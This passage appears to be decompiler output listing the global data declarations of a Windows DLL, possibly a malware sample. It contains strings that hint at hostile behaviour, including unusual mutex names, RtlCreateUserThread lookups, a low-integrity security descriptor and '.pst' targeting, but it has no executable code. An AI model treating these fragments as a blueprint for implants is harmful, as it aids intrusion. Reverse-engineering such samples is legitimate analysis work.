_UNKNOWN unk_10174A00; // weak
_UNKNOWN unk_10174B00; // weak
_UNKNOWN unk_10174B58; // weak
wchar_t word_10174BA4 = 0u; // idb
_UNKNOWN unk_10174BA8; // weak
_UNKNOWN unk_10174CB0; // weak
_UNKNOWN unk_10174DB0; // weak
_UNKNOWN unk_10174E08; // weak
_UNKNOWN unk_10174E58; // weak
_UNKNOWN unk_10174EB0; // weak
_UNKNOWN unk_10174EF8; // weak
_UNKNOWN unk_10174F24; // weak
_UNKNOWN unk_10174F54; // weak
_UNKNOWN unk_10174F88; // weak
_UNKNOWN unk_10174FC8; // weak
_UNKNOWN unk_10175004; // weak
_UNKNOWN unk_10175038; // weak
wchar_t asc_10175074[] = L"["; // idb
wchar_t asc_10175078[] = L"]"; // idb
_UNKNOWN unk_1017507C; // weak
_UNKNOWN unk_101750AC; // weak
wchar_t asc_101750E0[] = L"\\"; // idb
_UNKNOWN unk_101750E4; // weak
_UNKNOWN unk_10175120; // weak
wchar_t asc_10175154[] = L"<<"; // idb
wchar_t asc_1017515C[] = L">>"; // idb
wchar_t asc_10175164[] = L"\n"; // idb
wchar_t asc_10175168[] = L"\r"; // idb
wchar_t asc_1017516C[] = L" "; // idb
wchar_t a0Obj[] = L"0 obj"; // idb
wchar_t word_1017517C = 0u; // idb
wchar_t word_10175184 = 0u; // idb
wchar_t word_10175188 = 0u; // idb
_UNKNOWN unk_10175198; // weak
_UNKNOWN unk_10175298; // weak
_UNKNOWN unk_10175310; // weak
_UNKNOWN unk_10175378; // weak
_UNKNOWN unk_101753D0; // weak
_UNKNOWN unk_1017542C; // weak
_UNKNOWN unk_1017545C; // weak
_UNKNOWN unk_10175490; // weak
_UNKNOWN unk_101754C0; // weak
__int16 word_101754F8 = 0; // weak
wchar_t word_101754FC = 0u; // idb
wchar_t word_10175500 = 0u; // idb
wchar_t asc_10175504[] = L"."; // idb
wchar_t word_10175508 = 0u; // idb
SQLWCHAR szColumnName = 37u; // idb
wchar_t word_10175510 = 0u; // idb
wchar_t word_10175514 = 0u; // idb
wchar_t aYes[] = L"YES"; // idb
_UNKNOWN unk_10175530; // weak
_UNKNOWN unk_101756E4; // weak
wchar_t asc_10175714[] = L"\r\n"; // idb
wchar_t asc_1017571C[] = L"\r\n"; // idb
wchar_t word_10175724 = 0u; // idb
wchar_t word_10175728 = 0u; // idb
wchar_t word_1017572C = 0u; // idb
wchar_t asc_10175730[] = L" "; // idb
wchar_t asc_10175734[] = L"\r\n"; // idb
_UNKNOWN unk_10175748; // weak
wchar_t word_10175790 = 0u; // idb
wchar_t asc_10175794[] = L"\\*.*"; // idb
_UNKNOWN unk_101757B0; // weak
_UNKNOWN unk_10175800; // weak
_UNKNOWN unk_10175848; // weak
_UNKNOWN unk_10175890; // weak
wchar_t word_1017598C = 0u; // idb
_UNKNOWN unk_10175990; // weak
_UNKNOWN unk_10175A00; // weak
_UNKNOWN unk_10175A48; // weak
_UNKNOWN unk_10175A80; // weak
_UNKNOWN unk_10175AC8; // weak
int dword_10175B28 = 0; // weak
wchar_t word_10175B2C = 0u; // idb
wchar_t word_10175B30 = 0u; // idb
_UNKNOWN unk_10175B38; // weak
_UNKNOWN unk_10175BA8; // weak
_UNKNOWN unk_10175BF0; // weak
wchar_t word_10175BF4 = 0u; // idb
wchar_t word_10175BF8 = 0u; // idb
_UNKNOWN unk_10175C08; // weak
_UNKNOWN unk_10175C88; // weak
_UNKNOWN unk_10175CD0; // weak
_UNKNOWN unk_10175D08; // weak
_UNKNOWN unk_10175D4C; // weak
_UNKNOWN unk_10175D84; // weak
_UNKNOWN unk_10175DBC; // weak
_UNKNOWN unk_10175DF8; // weak
_UNKNOWN unk_10175E30; // weak
_UNKNOWN unk_10175E6C; // weak
_UNKNOWN unk_10175EA0; // weak
wchar_t asc_10175ED4[] = L"<<"; // idb
wchar_t asc_10175EDC[] = L">>"; // idb
wchar_t word_10175EE4 = 0u; // idb
wchar_t asc_10175EE8[] = L"\r"; // idb
wchar_t word_10175EEC = 0u; // idb
wchar_t asc_10175EF0[] = L"\n"; // idb
wchar_t asc_10175EF4[] = L")"; // idb
wchar_t asc_10175EF8[] = L")"; // idb
wchar_t word_10175EFC = 0u; // idb
_UNKNOWN unk_10175F10; // weak
_UNKNOWN unk_10176010; // weak
_UNKNOWN unk_10176058; // weak
_UNKNOWN unk_101760A4; // weak
_UNKNOWN unk_101760E0; // weak
_UNKNOWN unk_1017612C; // weak
_UNKNOWN unk_1017616C; // weak
_UNKNOWN unk_101761AC; // weak
_UNKNOWN unk_101761E4; // weak
_UNKNOWN unk_1017621C; // weak
_UNKNOWN unk_10176254; // weak
_UNKNOWN unk_10176280; // weak
_UNKNOWN unk_101762AC; // weak
_UNKNOWN unk_101762D8; // weak
wchar_t word_10176304 = 0u; // idb
_UNKNOWN unk_10176318; // weak
_UNKNOWN unk_10176414; // weak
_UNKNOWN unk_10176444; // weak
_UNKNOWN unk_10176474; // weak
_UNKNOWN unk_101764A4; // weak
_UNKNOWN unk_101764D8; // weak
_UNKNOWN unk_10176508; // weak
_UNKNOWN unk_10176538; // weak
_UNKNOWN unk_10176568; // weak
_UNKNOWN unk_10176598; // weak
_UNKNOWN unk_101765CC; // weak
_UNKNOWN unk_10176600; // weak
_UNKNOWN unk_10176634; // weak
_UNKNOWN unk_10176668; // weak
wchar_t word_1017669C = 0u; // idb
_UNKNOWN unk_101766B0; // weak
_UNKNOWN unk_10176700; // weak
wchar_t asc_10176748[] = L"\\"; // idb
const wchar_t asc_1017674C[] = L"."; // idb
_UNKNOWN unk_10176758; // weak
_UNKNOWN unk_10176798; // weak
_UNKNOWN unk_101767F0; // weak
__int64 qword_10176838 = 0i64; // weak
_UNKNOWN unk_10176850; // weak
_UNKNOWN unk_101768A8; // weak
_UNKNOWN unk_101768F0; // weak
_UNKNOWN unk_1017691C; // weak
_UNKNOWN unk_1017694C; // weak
wchar_t word_10176978 = 0u; // idb
wchar_t word_1017697C = 0u; // idb
wchar_t word_10176980 = 0u; // idb
wchar_t word_10176984 = 0u; // idb
wchar_t word_10176988 = 0u; // idb
wchar_t word_1017698C = 0u; // idb
wchar_t asc_10176990[] = L"\\"; // idb
int dword_10176994 = 3801176; // weak
_UNKNOWN unk_101769A0; // weak
wchar_t word_101769AC = 0u; // idb
_UNKNOWN unk_101769B0; // weak
wchar_t word_101769F8 = 0u; // idb
_UNKNOWN unk_10176A00; // weak
wchar_t word_10176B58 = 0u; // idb
_UNKNOWN unk_10176B60; // weak
_UNKNOWN unk_10176C28; // weak
wchar_t word_10176D18 = 0u; // idb
_UNKNOWN unk_10176D20; // weak
_UNKNOWN unk_10176E18; // weak
wchar_t word_10176E78 = 0u; // idb
_UNKNOWN unk_10176E80; // weak
_UNKNOWN unk_10176FA8; // weak
_UNKNOWN unk_10177048; // weak
wchar_t word_101770A4 = 0u; // idb
_UNKNOWN unk_101770A8; // weak
wchar_t word_10177184 = 0u; // idb
_UNKNOWN unk_10177188; // weak
_UNKNOWN unk_10177248; // weak
wchar_t word_101772F8 = 0u; // idb
_UNKNOWN unk_10177300; // weak
wchar_t word_101773E4 = 0u; // idb
_UNKNOWN unk_101773E8; // weak
wchar_t word_101774BC = 0u; // idb
_UNKNOWN unk_101774C0; // weak
_UNKNOWN unk_101775C8; // weak
_UNKNOWN unk_101776D0; // weak
wchar_t word_10177794 = 0u; // idb
_UNKNOWN unk_10177798; // weak
_UNKNOWN unk_101778B0; // weak
_UNKNOWN unk_10177998; // weak
_UNKNOWN unk_10177B40; // weak
_UNKNOWN unk_10177C30; // weak
_UNKNOWN unk_10177CE0; // weak
_UNKNOWN unk_10177E18; // weak
_UNKNOWN unk_10177F08; // weak
_UNKNOWN unk_10177FD8; // weak
_UNKNOWN unk_101780A8; // weak
_UNKNOWN unk_101780F8; // weak
_UNKNOWN unk_10178148; // weak
_UNKNOWN unk_101781A0; // weak
_UNKNOWN unk_101781F0; // weak
wchar_t word_10178238 = 0u; // idb
_UNKNOWN unk_10178248; // weak
_UNKNOWN unk_10178298; // weak
_UNKNOWN unk_101782E8; // weak
_UNKNOWN unk_10178340; // weak
wchar_t word_10178468 = 0u; // idb
_UNKNOWN unk_10178478; // weak
_UNKNOWN unk_10178580; // weak
wchar_t word_101785C8 = 0u; // idb
_UNKNOWN unk_101785D8; // weak
_UNKNOWN unk_10178630; // weak
_UNKNOWN unk_10178688; // weak
_UNKNOWN unk_101786E0; // weak
_UNKNOWN unk_10178730; // weak
_UNKNOWN unk_10178868; // weak
wchar_t word_1017898C = 0u; // idb
wchar_t word_10178990 = 0u; // idb
_UNKNOWN unk_10178998; // weak
_UNKNOWN unk_101789C8; // weak
_UNKNOWN unk_101789FC; // weak
_UNKNOWN unk_10178A2C; // weak
_UNKNOWN unk_10178A5C; // weak
_UNKNOWN unk_10178A8C; // weak
_UNKNOWN unk_10178AD0; // weak
wchar_t word_10178BF4 = 0u; // idb
wchar_t word_10178BF8 = 0u; // idb
wchar_t word_10178BFC = 0u; // idb
wchar_t word_10178C00 = 0u; // idb
wchar_t word_10178C04 = 0u; // idb
_UNKNOWN unk_10178C18; // weak
wchar_t word_10178C60 = 0u; // idb
_UNKNOWN unk_10178C78; // weak
wchar_t word_10178CC4 = 0u; // idb
wchar_t word_10178CC8 = 0u; // idb
char byte_10178CCC = '1'; // weak
_UNKNOWN unk_10178CD4; // weak
_UNKNOWN unk_10178D10; // weak
_UNKNOWN unk_10178D68; // weak
wchar_t word_10178DB0 = 0u; // idb
wchar_t word_10178DB8 = 0u; // idb
wchar_t word_10178DBC = 0u; // idb
_UNKNOWN unk_10178DC0; // weak
wchar_t aNtdllDll_4[] = L"ntdll.dll"; // idb
_UNKNOWN unk_10178E10; // weak
_UNKNOWN unk_10178E68; // weak
wchar_t word_10178E9C = 0u; // idb
_UNKNOWN unk_10178EA8; // weak
_UNKNOWN unk_10178F10; // weak
_UNKNOWN unk_10178F8C; // weak
wchar_t word_10178FC4 = 0u; // idb
wchar_t word_10178FC8 = 0u; // idb
_UNKNOWN unk_10178FE0; // weak
_UNKNOWN unk_10179010; // weak
_UNKNOWN unk_10179040; // weak
_UNKNOWN unk_10179070; // weak
_UNKNOWN unk_101790A0; // weak
_UNKNOWN unk_101790D0; // weak
_UNKNOWN unk_10179104; // weak
_UNKNOWN unk_10179138; // weak
wchar_t word_10179170 = 0u; // idb
wchar_t word_10179174 = 0u; // idb
wchar_t word_10179178 = 0u; // idb
wchar_t word_1017917C = 0u; // idb
wchar_t word_10179180 = 0u; // idb
wchar_t word_10179184 = 0u; // idb
_UNKNOWN unk_10179188; // weak
_UNKNOWN unk_101791C0; // weak
_UNKNOWN unk_101791F0; // weak
_UNKNOWN unk_10179230; // weak
_UNKNOWN unk_10179288; // weak
_UNKNOWN unk_101792D0; // weak
_UNKNOWN unk_10179314; // weak
_UNKNOWN unk_10179354; // weak
_UNKNOWN unk_10179384; // weak
_UNKNOWN unk_101793B4; // weak
_UNKNOWN unk_101793FC; // weak
_UNKNOWN unk_10179428; // weak
_UNKNOWN unk_10179464; // weak
_UNKNOWN unk_101794A8; // weak
wchar_t word_10179518 = 0u; // idb
_UNKNOWN unk_10179520; // weak
wchar_t aLnk[] = L"lnk"; // idb
wchar_t word_10179618 = 0u; // idb
_UNKNOWN unk_1017961C; // weak
_UNKNOWN unk_10179658; // weak
wchar_t aNtdllDll_1[] = L"ntdll.dll"; // idb
_UNKNOWN unk_10179704; // weak
_UNKNOWN unk_10179740; // weak
_UNKNOWN unk_10179760; // weak
wchar_t aKernel32Dll_0[] = L"kernel32.dll"; // idb
wchar_t aVirtualfree[] = L"VirtualFree"; // idb
wchar_t aGetprocaddress[] = L"GetProcAddress"; // idb
wchar_t aGetmodulehandl_0[] = L"GetModuleHandleA"; // idb
wchar_t aOpenthread[] = L"OpenThread"; // idb
wchar_t aExitthread[] = L"ExitThread"; // idb
wchar_t aKernel32Dll_3[] = L"kernel32.dll"; // idb
wchar_t aVirtualfree_0[] = L"VirtualFree"; // idb
wchar_t aExitthread_0[] = L"ExitThread"; // idb
_UNKNOWN unk_10179880; // weak
wchar_t aNtdllDll_2[] = L"ntdll.dll"; // idb
_UNKNOWN unk_101798F0; // weak
wchar_t word_10179950 = 0u; // idb
wchar_t aThPoolShdPqomg[] = L"TH_POOL_SHD_PQOMGMN_%dSYNCMTX"; // idb
wchar_t word_10179990 = 0u; // idb
wchar_t aThPoolShdMtxGm[] = L"TH_POOL_SHD_MTX_GMN94XQ_%d"; // idb
wchar_t aRtlcreateusert[] = L"RtlCreateUserThread"; // idb
wchar_t aNtdllDll_3[] = L"ntdll.dll"; // idb
wchar_t aGetmodulehandl[] = L"GetModuleHandleW"; // idb
_UNKNOWN unk_10179A30; // weak
_UNKNOWN unk_10179A70; // weak
_UNKNOWN unk_10179AA8; // weak
wchar_t word_10179B8C = 0u; // idb
_UNKNOWN unk_10179B90; // weak
_UNKNOWN unk_10179BC0; // weak
_UNKNOWN unk_10179BF0; // weak
_UNKNOWN unk_10179C20; // weak
_UNKNOWN unk_10179C50; // weak
_UNKNOWN unk_10179C80; // weak
WCHAR Class = 0u; // idb
wchar_t word_10179CB4 = 0u; // idb
wchar_t asc_10179CB8[] = L"\\\\"; // idb
wchar_t word_10179CC0 = 0u; // idb
wchar_t word_10179CD0 = 0u; // idb
wchar_t asc_10179CD4[] = L"."; // idb
wchar_t word_10179CD8 = 0u; // idb
wchar_t word_10179CDC = 0u; // idb
_UNKNOWN unk_10179CE8; // weak
int dword_10179DE8 = 0; // weak
wchar_t word_10179DEC = 0u; // idb
wchar_t aDvaaccessguard[] = L"DVAAccessGuard51EF43_ST_%u"; // idb
CHAR aNtdllDll_0[] = "ntdll.dll"; // idb
wchar_t aRtlexpandenvir[] = L"RtlExpandEnvironmentStrings_U"; // idb
wchar_t aRtlinitunicode[] = L"RtlInitUnicodeString"; // idb
_UNKNOWN unk_10179E9C; // weak
wchar_t asc_10179ECC[] = L"\\"; // idb
_UNKNOWN unk_10179F90; // weak
WCHAR StringSecurityDescriptor[] = L"S:(ML;;NW;;;LW)"; // idb
int dword_1017A020 = 0; // weak
int dword_1017A024 = 0; // weak
int dword_1017A028 = 0; // weak
WCHAR ModuleName[] = L"kernel32.dll"; // idb
CHAR ProcName[] = "GetProductInfo"; // idb
_UNKNOWN unk_1017A0B0; // weak
wchar_t aNtdllDll[] = L"ntdll.dll"; // idb
_UNKNOWN unk_1017A1D8; // weak
_UNKNOWN unk_1017A208; // weak
_UNKNOWN unk_1017A23C; // weak
_UNKNOWN unk_1017A26C; // weak
_UNKNOWN unk_1017A29C; // weak
_UNKNOWN unk_1017A2CC; // weak
_UNKNOWN unk_1017A2FC; // weak
wchar_t word_1017A32C = 0u; // idb
wchar_t word_1017A330 = 0u; // idb
wchar_t aD[] = L"%d"; // idb
_UNKNOWN unk_1017A340; // weak
wchar_t word_1017A374 = 0u; // idb
wchar_t word_1017A380 = 0u; // idb
wchar_t a08x[] = L"%08X"; // idb
wchar_t word_1017A39C = 0u; // idb
wchar_t aU[] = L"%u"; // idb
wchar_t word_1017A3E0 = 0u; // idb
_UNKNOWN unk_1017A3E4; // weak
_UNKNOWN unk_1017A41C; // weak
_UNKNOWN unk_1017A45C; // weak
_UNKNOWN unk_1017A498; // weak
_UNKNOWN unk_1017A4E0; // weak
_UNKNOWN unk_1017A528; // weak
CHAR Name[] = "MSPDQMut"; // idb
wchar_t word_1017A56C = 0u; // idb
_UNKNOWN unk_1017A574; // weak
_UNKNOWN unk_1017A5A0; // weak
_UNKNOWN unk_1017A6C4; // weak
_UNKNOWN unk_1017A6FC; // weak
wchar_t word_1017A734 = 0u; // idb
wchar_t word_1017A738 = 0u; // idb
wchar_t word_1017A73C = 0u; // idb
wchar_t word_1017A740 = 0u; // idb
wchar_t aPst[] = L".pst"; // idb
_UNKNOWN unk_1017A750; // weak
_UNKNOWN unk_1017A780; // weak
_UNKNOWN unk_1017A7B4; // weak
_UNKNOWN unk_1017A7E4; // weak
_UNKNOWN unk_1017A814; // weak
_UNKNOWN unk_1017A844; // weak
_UNKNOWN unk_1017A888; // weak
int dword_1017A8D0 = 0; // weak
_UNKNOWN unk_1017A8D4; // weak
_UNKNOWN unk_1017A908; // weak
_UNKNOWN unk_1017A93C; // weak
_UNKNOWN unk_1017A96C; // weak
_UNKNOWN unk_1017A99C; // weak
_UNKNOWN unk_1017A9CC; // weak
_UNKNOWN unk_1017AA04; // weak
_UNKNOWN unk_1017AA38; // weak
_UNKNOWN unk_1017AA68; // weak
_UNKNOWN unk_1017AA98; // weak
_UNKNOWN unk_1017AAC8; // weak
_UNKNOWN unk_1017AB00; // weak
_UNKNOWN unk_1017AB40; // weak
_UNKNOWN unk_1017AB80; // weak
_UNKNOWN unk_1017ABC8; // weak
_UNKNOWN unk_1017AC04; // weak
_UNKNOWN unk_1017AC3C; // weak
_UNKNOWN unk_1017AC80; // weak
_UNKNOWN unk_1017ACD0; // weak
_UNKNOWN unk_1017AD10; // weak
_UNKNOWN unk_1017AD4C; // weak
_UNKNOWN unk_1017AD8C; // weak
_UNKNOWN unk_1017ADC8; // weak
_UNKNOWN unk_1017AE0C; // weak
_UNKNOWN unk_1017AE40; // weak
_UNKNOWN unk_1017AE84; // weak
_UNKNOWN unk_1017AEB8; // weak
_UNKNOWN unk_1017AF00; // weak
_UNKNOWN unk_1017AF30; // weak
_UNKNOWN unk_1017AF70; // weak
_UNKNOWN unk_1017AFA0; // weak
_UNKNOWN unk_1017AFF0; // weak
_UNKNOWN unk_1017B030; // weak
_UNKNOWN unk_1017B070; // weak
_UNKNOWN unk_1017B0B4; // weak
_UNKNOWN unk_1017B0F0; // weak
_UNKNOWN unk_1017B140; // weak
_UNKNOWN unk_1017B188; // weak
_UNKNOWN unk_1017B1B8; // weak
_UNKNOWN unk_1017B204; // weak
_UNKNOWN unk_1017B240; // weak
_UNKNOWN unk_1017B284; // weak
_UNKNOWN unk_1017B2B8; // weak
_UNKNOWN unk_1017B30C; // weak
_UNKNOWN unk_1017B344; // weak
_UNKNOWN unk_1017B374; // weak
_UNKNOWN unk_1017B3A4; // weak
_UNKNOWN unk_1017B3D8; // weak
_UNKNOWN unk_1017B434; // weak
_UNKNOWN unk_1017B464; // weak
_UNKNOWN unk_1017B498; // weak
_UNKNOWN unk_1017B4D8; // weak
_UNKNOWN unk_1017B510; // weak
_UNKNOWN unk_1017B548; // weak
_UNKNOWN unk_1017B580; // weak
_UNKNOWN unk_1017B5B8; // weak
_UNKNOWN unk_1017B5F4; // weak
_UNKNOWN unk_1017B630; // weak
_UNKNOWN unk_1017B660; // weak
_UNKNOWN unk_1017B694; // weak
_UNKNOWN unk_1017B6CC; // weak
_UNKNOWN unk_1017B700; // weak
_UNKNOWN unk_1017B734; // weak
_UNKNOWN unk_1017B76C; // weak
_UNKNOWN unk_1017B7A4; // weak
_UNKNOWN unk_1017B7E8; // weak
_UNKNOWN unk_1017B82C; // weak
_UNKNOWN unk_1017B864; // weak
_UNKNOWN unk_1017B8A0; // weak
_UNKNOWN unk_1017B8D0; // weak
_UNKNOWN unk_1017B920; // weak
_UNKNOWN unk_1017B970; // weak
_UNKNOWN unk_1017B9B8; // weak
_UNKNOWN unk_1017B9F0; // weak
_UNKNOWN unk_1017BA2C; // weak
_UNKNOWN unk_1017BA5C; // weak
_UNKNOWN unk_1017BA8C; // weak
_UNKNOWN unk_1017BAC8; // weak
_UNKNOWN unk_1017BB10; // weak
_UNKNOWN unk_1017BB5C; // weak
_UNKNOWN unk_1017BB9C; // weak
_UNKNOWN unk_1017BBD8; // weak
_UNKNOWN unk_1017BC08; // weak
_UNKNOWN unk_1017BC48; // weak
_UNKNOWN unk_1017BC84; // weak
_UNKNOWN unk_1017BCB8; // weak
_UNKNOWN unk_1017BCEC; // weak
_UNKNOWN unk_1017BD28; // weak
_UNKNOWN unk_1017BD70; // weak
_UNKNOWN unk_1017BDB8; // weak
_UNKNOWN unk_1017BE18; // weak
_UNKNOWN unk_1017BE68; // weak
_UNKNOWN unk_1017BE98; // weak
_UNKNOWN unk_1017BECC; // weak
_UNKNOWN unk_1017BF00; // weak
_UNKNOWN unk_1017BF30; // weak
_UNKNOWN unk_1017BF70; // weak
_UNKNOWN unk_1017BFB8; // weak
_UNKNOWN unk_1017C000; // weak
_UNKNOWN unk_1017C040; // weak
_UNKNOWN unk_1017C090; // weak
_UNKNOWN unk_1017C0D8; // weak
_UNKNOWN unk_1017C120; // weak
wchar_t word_1017C160 = 0u; // idb
wchar_t word_1017C164 = 0u; // idb
wchar_t word_1017C168 = 0u; // idb
wchar_t word_1017C16C = 0u; // idb
wchar_t word_1017C170 = 0u; // idb
wchar_t word_1017C174 = 0u; // idb
_UNKNOWN unk_1017C178; // weak
_UNKNOWN unk_1017C1C8; // weak
_UNKNOWN unk_1017C214; // weak
_UNKNOWN unk_1017C244; // weak
_UNKNOWN unk_1017C274; // weak
_UNKNOWN unk_1017C2A4; // weak
_UNKNOWN unk_1017C2D4; // weak
_UNKNOWN unk_1017C304; // weak
_UNKNOWN unk_1017C334; // weak
_UNKNOWN unk_1017C364; // weak
_UNKNOWN unk_1017C394; // weak
_UNKNOWN unk_1017C3C4; // weak
_UNKNOWN unk_1017C3F4; // weak
_UNKNOWN unk_1017C424; // weak
_UNKNOWN unk_1017C458; // weak
_UNKNOWN unk_1017C488; // weak
_UNKNOWN unk_1017C4B8; // weak
_UNKNOWN unk_1017C4E8; // weak
_UNKNOWN unk_1017C51C; // weak
_UNKNOWN unk_1017C550; // weak
_UNKNOWN unk_1017C584; // weak
_UNKNOWN unk_1017C5B8; // weak
_UNKNOWN unk_1017C5E8; // weak
_UNKNOWN unk_1017C618; // weak
_UNKNOWN unk_1017C64C; // weak
_UNKNOWN unk_1017C67C; // weak
_UNKNOWN unk_1017C6B4; // weak
_UNKNOWN unk_1017C6EC; // weak
_UNKNOWN unk_1017C720; // weak
_UNKNOWN unk_1017C768; // weak
_UNKNOWN unk_1017C7AC; // weak
_UNKNOWN unk_1017C7DC; // weak
_UNKNOWN unk_1017C810; // weak
_UNKNOWN unk_1017C83C; // weak
_UNKNOWN unk_1017C874; // weak
_UNKNOWN unk_1017C8A8; // weak
_UNKNOWN unk_1017C91C; // weak
_UNKNOWN unk_1017C950; // weak
_UNKNOWN unk_1017C9C0; // weak
_UNKNOWN unk_1017C9F0; // weak
_UNKNOWN unk_1017CA20; // weak
_UNKNOWN unk_1017CA50; // weak
_UNKNOWN unk_1017CAC4; // weak
_UNKNOWN unk_1017CAF8; // weak
_UNKNOWN unk_1017CB5C; // weak
_UNKNOWN unk_1017CB8C; // weak
_UNKNOWN unk_1017CBC0; // weak
_UNKNOWN unk_1017CC34; // weak
_UNKNOWN unk_1017CC68; // weak
_UNKNOWN unk_1017CCE4; // weak
_UNKNOWN unk_1017CD14; // weak
_UNKNOWN unk_1017CD48; // weak
_UNKNOWN unk_1017CDBC; // weak
_UNKNOWN unk_1017CDF0; // weak
_UNKNOWN unk_1017CE54; // weak
_UNKNOWN unk_1017CE84; // weak
_UNKNOWN unk_1017CEB4; // weak
_UNKNOWN unk_1017CEE4; // weak
_UNKNOWN unk_1017CF14; // weak
_UNKNOWN unk_1017CF44; // weak
_UNKNOWN unk_1017CF74; // weak
_UNKNOWN unk_1017CFA0; // weak
_UNKNOWN unk_1017CFE0; // weak
_UNKNOWN unk_1017D020; // weak
_UNKNOWN unk_1017D060; // weak
_UNKNOWN unk_1017D0A0; // weak
_UNKNOWN unk_1017D0E0; // weak
_UNKNOWN unk_1017D120; // weak
_UNKNOWN unk_1017D15C; // weak
_UNKNOWN unk_1017D198; // weak
_UNKNOWN unk_1017D1D8; // weak
_UNKNOWN unk_1017D218; // weak
_UNKNOWN unk_1017D258; // weak
_UNKNOWN unk_1017D294; // weak
_UNKNOWN unk_1017D2D0; // weak
_UNKNOWN unk_1017D310; // weak
_UNKNOWN unk_1017D358; // weak
_UNKNOWN unk_1017D3A8; // weak
_UNKNOWN unk_1017D3E8; // weak
_UNKNOWN unk_1017D428; // weak
_UNKNOWN unk_1017D468; // weak
_UNKNOWN unk_1017D4A8; // weak
_UNKNOWN unk_1017D508; // weak
_UNKNOWN unk_1017D548; // weak
_UNKNOWN unk_1017D59C; // weak
_UNKNOWN unk_1017D5D4; // weak
_UNKNOWN unk_1017D610; // weak
_UNKNOWN unk_1017D650; // weak
_UNKNOWN unk_1017D690; // weak
_UNKNOWN unk_1017D6CC; // weak
_UNKNOWN unk_1017D708; // weak
_UNKNOWN unk_1017D744; // weak
_UNKNOWN unk_1017D77C; // weak
_UNKNOWN unk_1017D7BC; // weak
_UNKNOWN unk_1017D7F8; // weak
_UNKNOWN unk_1017D834; // weak
_UNKNOWN unk_1017D870; // weak
_UNKNOWN unk_1017D8B0; // weak
_UNKNOWN unk_1017D8E8; // weak
_UNKNOWN unk_1017D928; // weak
_UNKNOWN unk_1017D970; // weak
_UNKNOWN unk_1017D9B4; // weak
_UNKNOWN unk_1017D9F4; // weak
_UNKNOWN unk_1017DA38; // weak
_UNKNOWN unk_1017DA7C; // weak
_UNKNOWN unk_1017DAB8; // weak
wchar_t word_1017DB00 = 0u; // idb
int (__thiscall **off_1017DB04)(void *Block, char) = &off_10102884; // weak
DWORD dword_1017DB08 = 0u; // idb
_DWORD dword_1017DB0C = 0; // weak
int dword_1017DB10 = 0; // weak
_DWORD dword_1017DB14 = 0; // weak
HANDLE hMutex = NULL; // idb
int dword_1017DB1C = 0; // weak
LPVOID Environment = NULL; // idb
char *dword_1017DB24 = NULL; // idb
char *dword_1017DB28 = NULL; // idb
_DWORD dword_1017DB2C[2] = { 0, 0 }; // weak
wchar_t *String2 = NULL; // idb
wchar_t *dword_1017DB38 = NULL; // idb
char ArgList[] = { '\0', '\0', '\0', '\0' }; // idb
wchar_t *dword_1017DB40 = NULL; // idb
char dword_1017DB44[] = { '\0', '\0', '\0', '\0' }; // idb
_DWORD dword_1017DB48 = 0; // weak
HANDLE hHandle = NULL; // idb
_DWORD dword_1017DB50 = 0; // weak
HANDLE hEvent = NULL; // idb
_DWORD dword_1017DB58[2] = { 0, 0 }; // weak
int dword_1017DB60 = 0; // weak
wchar_t word_1017DB80 = 0u; // idb
int dword_1017DF20 = 0; // weak
int dword_1017E02C = 0; // weak
int dword_1017E0F4 = 0; // weak
_UNKNOWN unk_1017E4D8; // weak
_UNKNOWN unk_1017E5D8; // weak
_BYTE byte_1017E6D8[52] =
{
  0,
  16,
  18,
  16,
  18,
  16,
  16,
  18,
  18,
  18,
  20,
  34,
  0,
  0,
  48,
  48,
  48,
  48,
  64,
  64,
  64,
  64,
  80,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  16,
  16,
  18,
  18,
  16,
  16,
  18,
  18,
  64,
  64,
  64,
  33,
  0,
  0,
  0
}; // weak
char a0_0[] = "0#?, "; // idb
wchar_t asc_1017E714[3] = L"%f"; // weak
wchar_t asc_1017E71C[5] = L"%.*f"; // weak
wchar_t aE[5] = L"%.*E"; // weak
wchar_t aNotASheet[12] = L"Not a sheet"; // weak
wchar_t aSingleSheet_0[13] = L"Single Sheet"; // weak
wchar_t aWorkbook[9] = L"Workbook"; // weak
char aExclusive[10] = "exclusive"; // weak
char aNormal_0[7] = "normal"; // weak
char aNone[5] = "none"; // weak
char aFull[5] = "full"; // weak
char aIncremental[12] = "incremental"; // weak
char aFile[5] = "file"; // weak
char aMemory_2[7] = "memory"; // weak
char aTemporaryStora[62] = "temporary storage cannot be changed from within a transaction"; // weak
char aSetNull[9] = "SET NULL"; // weak
char aSetDefault[12] = "SET DEFAULT"; // weak
char aCascade[8] = "CASCADE"; // weak
char aRestrict[9] = "RESTRICT"; // weak
char aNoAction[10] = "NO ACTION"; // weak
char aT[4] = "-%T"; // weak
char aDefaultCacheSi[19] = "default_cache_size"; // weak
char aCacheSize[11] = "cache_size"; // weak
char aPageSize[10] = "page_size"; // weak
char aPageSize_0[10] = "page_size"; // weak
char aMaxPageCount[15] = "max_page_count"; // weak
char aMaxPageCount_0[15] = "max_page_count"; // weak
char aPageCount[11] = "page_count"; // weak
char aPageCount_0[11] = "page_count"; // weak
char aLockingMode[13] = "locking_mode"; // weak
char aNormal[7] = "normal"; // weak
char aExclusive_0[10] = "exclusive"; // weak
char aLockingMode_0[13] = "locking_mode"; // weak
char aJournalMode[13] = "journal_mode"; // weak
char aJournalMode_0[13] = "journal_mode"; // weak
char aJournalSizeLim[19] = "journal_size_limit"; // weak
char aJournalSizeLim_0[19] = "journal_size_limit"; // weak
char aAutoVacuum[12] = "auto_vacuum"; // weak
char aAutoVacuum_0[12] = "auto_vacuum"; // weak
char aIncrementalVac[19] = "incremental_vacuum"; // weak
char aCacheSize_0[11] = "cache_size"; // weak
char aCacheSize_1[11] = "cache_size"; // weak
char aTempStore[11] = "temp_store"; // weak
char aTempStore_0[11] = "temp_store"; // weak
char aTempStoreDirec[21] = "temp_store_directory"; // weak
char aTempStoreDirec_0[21] = "temp_store_directory"; // weak
char aNotAWritableDi[25] = "not a writable directory"; // weak
char aSynchronous[12] = "synchronous"; // weak
char aSynchronous_0[12] = "synchronous"; // weak
char aSafetyLevelMay[53] = "Safety level may not be changed inside a transaction"; // weak
char aTableInfo[11] = "table_info"; // weak
char aCid[4] = "cid"; // weak
char aName[5] = "name"; // weak
char aType[5] = "type"; // weak
char aNotnull[8] = "notnull"; // weak
char aDfltValue[11] = "dflt_value"; // weak
char aPk[3] = "pk"; // weak
char aIndexInfo[11] = "index_info"; // weak
char aSeqno[6] = "seqno"; // weak
char aCid_0[4] = "cid"; // weak
char aName_0[5] = "name"; // weak
char aIndexList[11] = "index_list"; // weak
